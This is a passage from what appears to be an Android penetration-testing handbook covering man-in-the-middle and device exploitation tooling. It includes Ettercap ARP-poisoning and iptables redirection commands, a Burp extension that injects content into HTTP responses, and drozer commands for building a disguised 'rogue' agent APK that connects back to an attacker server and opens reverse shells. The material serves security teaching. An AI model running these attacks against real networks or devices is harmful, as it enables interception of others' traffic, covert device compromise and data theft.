$ sudo make install
...
A successful compilation and installation are all that is required to start performing man-in-the-middle attacks.
Finding Android devices on a wireless network that you are connected to is not a simple task. They have no real
identifiable attributes on a network that allow for easy fingerprinting. A best-effort approach would be to look
out for MAC addresses that are associated with manufacturers that are known to make Android devices. This is
still a sub-optimal approach though because not all Organizationally Unique Identifiers (OUIs) are recognized
by nmap (see http://nmap.org/). Using a ping sweep with nmap will show a mapping of discovered MAC
addresses and their manufacturers:
$ sudo nmap -sP 192.168.1.0/24
Starting Nmap 6.40 ( http://nmap.org ) at 2014-11-08 16:52 SAST
Nmap scan report for router (192.168.1.1)
Host is up (0.0019s latency).
MAC Address: D4:CA:6D:AE:F8:76 (Routerboard.com)
...
Nmap scan report for 192.168.1.100
Host is up (-0.065s latency).
MAC Address: 40:0E:85:56:62:C9 (Samsung Electro Mechanics co.)
...
Nmap scan report for 192.168.1.109
Host is up (0.033s latency).
MAC Address: 5C:0A:5B:53:AC:1F (Samsung Electro-mechanics CO.)
...
Nmap scan report for 192.168.1.117
Host is up (-0.060s latency).
MAC Address: 30:85:A9:60:D2:A1 (Asustek Computer)
...
Nmap done: 256 IP addresses (13 hosts up) scanned in 4.21 seconds
The network shown here has two Samsung devices and a Nexus 7 tablet that is made by Asus. You can use the
following command on Ettercap to intercept the connection between the network gateway and the Nexus 7
tablet:
$ sudo ettercap -i wlan0 -Tq -M ARP:remote /192.168.1.1/ /192.168.1.117/
ettercap 0.8.1 copyright 2001-2014 Ettercap Development Team
Listening on:
eth0 -> 80:FA:5B:07:23:B3
192.168.1.102/255.255.255.0
fe80::82fa:5bff:fe07:23b3/64
SSL dissection needs a valid 'redir_command_on' script in the etter.
conf file
Privileges dropped to UID 0 GID 65534...
33 plug-ins
42 protocol dissectors
57 ports monitored
19839 mac vendor fingerprint
1766 tcp OS fingerprint
2182 known services
Scanning for merged targets (2 hosts)...
* |==================================================>| 100.00 %
1 hosts added to the hosts list...
ARP poisoning victims:
GROUP 1 : 192.168.1.1 D4:CA:6D:AE:F8:76
Starting Unified sniffing...
Text only Interface activated...
Hit 'h' for inline help
NOTE
Not specifying the interface in Ettercap may result in an error saying "FATAL: ARP poisoning needs a non-
empty hosts list." This error occurs because Ettercap is trying to scan for hosts on an interface you may
not be using for your target network. Therefore, always specifying an interface is recommended.
Following these steps allows you to ARP spoof between the gateway and the device at 192.168.1.117. Opening a
packet sniffer such as Wireshark and capturing on “any” interface reveals all traffic, even that coming from your
victim device. You can now manipulate any aspect of this device's traffic. Some useful plug-ins come pre-
installed inside Ettercap, such as DNS spoofing. Being able to effectively manipulate another user on the same
network's traffic is not only an essential skill for an Android hacker, but also for any competent network
penetration tester.
Burp Suite
In addition to Burp Suite being the de facto web application testing tool, it is also a brilliant tool to use when
performing a man-in-the-middle attack. After a successful traffic interception attack against a device we will be
using it to proxy and view web traffic. If a device's traffic is already coming through your computer, you can set
up routing rules to redirect traffic to a certain port through the Burp proxy.
Setting Up Burp for Network Interception
To set up interception of web traffic destined to port 80, perform the following:
1. Open Burp and go to Proxy ➢ Options.
2. Add a new proxy listener.
3. In the Binding tab specify the port as 8080 and bind to all interfaces.
4. In the Request handling tab, tick Support Invisible Proxying.
5. In the Certificate tab select Generate CA-Signed per-host Certificates.
Burp is now set up correctly to transparently proxy traffic. Now use an iptables rule to redirect incoming traffic
passing through the computer destined for port 80 to the Burp listener at port 8080. You can do this as follows:
$ sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j
REDIRECT --to-port 8080
You are now proxying cleartext HTTP traffic from this device and viewing it in the HTTP history tab in Burp.
Make sure that the interception button is off in Burp otherwise you will be blocking all web traffic from passing
through Burp to the intended recipient. You can use the same command to send HTTPS traffic to Burp using --
dport 443 instead of --dport 80. However, the user will receive certificate warnings when browsing HTTPS
websites. SSL validation will also fail inside applications unless the developer has conveniently nullified these
checks. In general, receiving certificate warnings causes the user to become more suspicious and may result in
their disconnecting from the network.
Using Burp Extensions
Burp enables a hacker to see all web traffic coming from a device when performing a man-in-the-middle attack.
Combining this with Burp custom extensions means that it is the perfect attack tool for manipulating web traffic
to and from a server. Many of the attacks presented later in the section under “Man-in-the-Middle Exploits” rely
on being able to inject new content into an application's HTTP stream. In preparation for this, we will create an
example Burp extension that injects a JavaScript alert() into received HTML pages on the fly.
Burp must be set up correctly to be able to handle Python modules. The Extender tab in Burp under Options has
a section called Python Environment. Using Python extensions in Burp requires the standalone Jython JAR to
be specified. You can download it from http://www.jython.org/downloads.html. Remember to download the
Standalone JAR version of Jython. After it is downloaded point Burp to the location of the JAR under the
Python Environment section in Burp. Python extensions can be used within Burp. A basic module named
inject.py that injects a JavaScript alert into the HTTP response is shown here with inline comments:
from burp import IBurpExtender, IHttpListener
class BurpExtender(IBurpExtender, IHttpListener):
def registerExtenderCallbacks(self, callbacks):
# Make callbacks available to whole class
self._callbacks = callbacks
# Make helpers available to whole class
self._helpers = callbacks.getHelpers()
# Set name
callbacks.setExtensionName("Inject JavaScript Alert")
# Register HTTP listener
callbacks.registerHttpListener(self)
return
def processHttpMessage(self, toolFlag, messageIsRequest,
messageInfo):
# Only process responses
if not messageIsRequest:
# Get response
response = messageInfo.getResponse()
responseStr = self._callbacks.getHelpers()
.bytesToString(response)
responseParsed = self._helpers.analyzeResponse(response)
body = responseStr[responseParsed.getBodyOffset():]
headers = responseParsed.getHeaders()
# Inject  into 
changedBody = body.replace("",
"")
changedBodyBytes = self._callbacks.getHelpers()
.stringToBytes(changedBody)
httpResponse = self._callbacks.getHelpers()
.buildHttpMessage(headers, changedBodyBytes);
# Set the response if the body changed and alert
if body != changedBody:
messageInfo.setResponse(httpResponse)
self._callbacks.issueAlert("Injected JavaScript!")
You can load this module by going to the Extender tab and adding the module. Every time an alert is injected
into the HTTP response, a log entry is added in the Alerts tab inside Burp. You are going to be making extensive
use of Burp extensions, so tinkering with them to understand how they work would be best.
drozer
drozer offers features to help compromise devices remotely, through means of exploiting applications on the
device or performing attacks that involve a degree of social engineering. drozer provides a framework for the
sharing of exploits and reuse of high-quality payloads. It also allows the sharing of post-exploitation modules
through a central online repository.
Up until now you've probably been running drozer in “direct mode” where you run the agent's embedded server
and connect directly to the device. This agent also had a single permission: INTERNET. drozer supports another
mode of operation dubbed “infrastructure mode.” In infrastructure mode, you run a drozer server either on your
network or on the Internet that provides a rendezvous point for your consoles and agents and routes sessions
between them. This mode of operation is most useful when you are deploying a payload onto a remote device
that must connect back to your server.
Here are all the subcommands available when running drozer:
$ drozer
usage: drozer [COMMAND]
Run `drozer [COMMAND] --help` for more usage information.
Commands:
console start the drozer Console
module manage drozer modules
server start a drozer Server
ssl manage drozer SSL key material
exploit generate an exploit to deploy drozer
agent create custom drozer Agents
payload generate payloads to deploy drozer
Using the Server
You can start a drozer server by simply running the following:
$ drozer server start
Starting drozer Server, listening on 0.0.0.0:31415
To change the default listening port you append --port  to the command. The drozer server is the central
point of contact for any payload and so it has to be multi-faceted. It can speak many protocols depending on the
code connecting to it; for instance:
drozerp—If a drozer agent connects then it uses drozer's custom binary protocol.
HTTP—If a web browser connects, it serves resources like a standard web server.
Bytestream—If a byte is sent at the beginning of a transmission, it streams a configurable resource in
response.
Shell server—If an “S” is sent as the first byte, the connection is saved as a shell that the attacker can use.
The exploitation flow with drozer makes heavy use of this server—from hosting the resources required to
successfully compromise a device, to catching all kinds of reverse connections after exploitation has been
successful. The HTTP web server code inside the drozer server also has a host of other features like:
User-agent checking—This locks the response of a web resource to only matching user agents.
Configurable MIME-types—Web resources can be set with a certain MIME-type.
Custom server headers—Responses on web resources can include custom server headers.
Resource path wildcards—Use wildcards when specifying a resource path for maximum flexibility.
Resource path counters—This allows the exploitation payload to retrieve how many times a certain
resource has been downloaded from the server.
Rogue Agents
Previous chapters have focused on using drozer as an assessment tool, which mostly required the agent to have
minimal permissions. The requirements for an exploitation payload are a little different. Some of the main
differences between a standard drozer agent and its darker rogue agent are as follows:
Rogue agents do not have a main activity. Therefore, there is no launcher icon for it.
Its application label is “sysplug-in” and not “drozer agent”. This is so that when it is installed it is not obvious
what it is.
Rogue agents by default request many permissions. This is so that when it gets installed on a device it is able
to perform post-exploitation without hindrance.
To build a rogue drozer agent that connects back to 192.168.1.112 on port 80, you can use the following
command:
$ drozer agent build --rogue --server 192.168.1.112:80
Done: /tmp/tmpgm4hq7/agent.apk
A rogue agent has to be invoked by the exploit that installed it. It does not have a launcher icon and so the user
cannot invoke it. They can be invoked with one of the following methods depending on the device:
Starting the service at com.mwr.dz/.Agent
Starting the activity by viewing pwn:// in a browser
Sending a broadcast with an action of com.mwr.dz.PWN
Built-In Exploits
drozer exploits are modules that in some way allow you to get code execution on a device. To get a list of all
available exploits inside drozer, issue the following command:
$ drozer exploit list
Exploitation modules are ones that specify the following attribute in their code:
module_type="exploit"
This makes the module available outside of the drozer console and available under the drozer exploits list. This
provides a logical separation between modules that can be run when access has been obtained on a device and
those that can be used to get code execution on a device. We make extensive use of exploits in this chapter and
explain their usage in their appropriate sections.
Using Standard Payloads
drozer payloads are the raw commands or shell code that you can embed inside an exploit to integrate with the
drozer exploitation flow. The following payloads were available at the time of writing:
$ drozer payload list
shell.reverse_tcp.armeabi Establish a reverse TCP Shell (ARMEABI)
weasel.reverse_tcp.armeabi weasel through a reverse TCP Shell (ARMEABI)
weasel.shell.armeabi Deploy weasel, through a set of Shell
commands (ARMEABI)
When choosing a payload, making use of weasel, drozer's multi-purpose payload, is good practice. Weasel
automatically tries to gain maximum leverage on a device and set up the exploited application to connect back to
the drozer server. Weasel tries a number of techniques to run a drozer agent after exploitation has taken place:
If you have exploited a privileged application, weasel will attempt to install a full rogue agent APK and start
it.
Weasel performs a technique that replaces the running process with a drozer agent (in JAR format) using
the app_process binary present on Android devices. This method causes the drozer agent to lose Context. The
consequences of this are shown in relevant sections in the remainder of the chapter. This agent without
Context is referred to as a limited agent.
Weasel also provides a normal reverse shell connection back to the drozer server, in case the other
techniques have failed. Obtaining a drozer session is much better than obtaining a normal shell though
because of all the additional functionality it provides.
Weasel may sometimes fail to load a limited agent using the app_process method because this technique is very
sensitive to having the correct environment variables set, particularly the BOOTCLASSPATH variable. A lot of the
time when weasel has been loaded, the exploitation technique used has trashed the process's environment
variables and so weasel has to do some guesswork to reconstruct the BOOTCLASSPATH. This method also does not
allow the agent to obtain the exploited application's Context, which limits access to standard Android features.
MitM Helper Extension for Burp
Performing a man-in-the-middle attack as presented earlier in this chapter is a powerful method for
compromising applications. To help better integrate drozer into this process, a Burp extension was created for
performing common attack tasks. It is located inside the installed drozer directory:
/src/drozer/lib/scripts/mitm-helper.py. You load it by going to the Extensions ➢ Add button and then
selecting the file. This extension relies on Jython being properly set up in the Extender ➢ Options tab. We
explore the use of this extension in the “Man-in-the-Middle Exploits” section later in this chapter.
Explanation of Privilege Levels
Before delving into the exploitation of devices, knowing what kind of access an attacker can obtain on devices
and what privilege level is associated with this access is useful.
Non-System Application without Context
The classic Android hacking demonstration shown on the Internet is visiting a website and an attacker gaining
shell access to a device. With this access he obtains the privilege level of the compromised application and can
navigate the filesystem under the user context of the browser. This level of access does not allow the attacker to
invoke functionality on the OS that uses any Java libraries. This means that if the compromised application has
been granted the READ_SMS permission, the attacker will not have access to the associated content providers
because he is unable to create and invoke any Java code from the Context class. Permissions that map directly to
the application UID being part of a group (e.g., READ_EXTERNAL_STORAGE) will allow the attacker to access the SD
card because this is within the constraints of a Linux shell. Typically, non-system applications do not have the
ability to install additional packages unless the compromised application holds the INSTALL_PACKAGES
permission. If this is the case the attacker could use pm install to install a full malicious Android package.
However, as mentioned previously drozer contains a payload called weasel that performs some tricks to be able
to load a rogue drozer agent without installing an application. Using weasel, replacing the compromised
application's process in memory with that of a drozer agent is possible. However, the drozer agent will not be
able to obtain Context. Context is a class that provides information about a particular application's environment.
It provides access to IPC functionality provided by Binder and allows the invocation of all the application
components. If an attacker's code is able to run and obtain Context then it is able to make use of the
permissions granted to the application. drozer will detect whether the instance received has Context or not and
adjust the available modules inside the console to only those that can work without Context.
Non-System Application with Context
An exploit payload that is able to take over an application's execution flow and load its own arbitrary classes will
be able to retrieve application Context. An attacker would be able to leverage the permissions of the granted
application to perform post-exploitation tasks. For example, if the compromised application held the READ_SMS
permission then the attacker's code would be able to query the content://sms content provider. When an
attacker's code is able to obtain Context it is immediately a lot more dangerous than without it.
Installed Package
An installed package can request an arbitrary set of permissions and be granted them depending on the